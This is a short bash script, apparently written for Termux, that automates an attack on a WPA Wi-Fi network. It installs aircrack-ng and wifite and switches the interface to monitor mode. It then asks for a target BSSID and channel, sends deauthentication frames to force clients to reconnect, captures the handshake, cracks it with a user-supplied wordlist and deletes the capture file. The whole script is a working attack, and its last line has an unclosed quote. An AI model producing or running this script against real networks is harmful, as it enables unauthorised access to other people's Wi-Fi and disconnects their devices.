#!/bin/bash

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

# Ensure necessary tools are installed
echo "Checking for required tools..."
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install aircrack-ng -y
pip install wifite

# Put the network interface into monitor mode
echo "Putting the network interface into monitor mode..."
airmon-ng start wlan0

# Capture handshake
echo "Capturing handshake..."
airodump-ng wlan0mon

echo "Enter the target BSSID:"
read bssid
echo "Enter the target channel:"
read channel

# Focus the capture on the target network
airodump-ng --bssid $bssid --channel $channel -w capture wlan0mon &

# Deauthenticate a client to force a handshake
echo "Deauthenticating clients to capture handshake..."
aireplay-ng --deauth 10 -a $bssid wlan0mon

# Crack the handshake
echo "Attempting to crack the handshake..."
echo "Enter the path to your wordlist:"
read wordlist
aircrack-ng -w $wordlist -b $bssid capture*.cap

# Clean up
echo "Cleaning up..."
airmon-ng stop wlan0mon
rm capture*.cap

echo "Script completed.
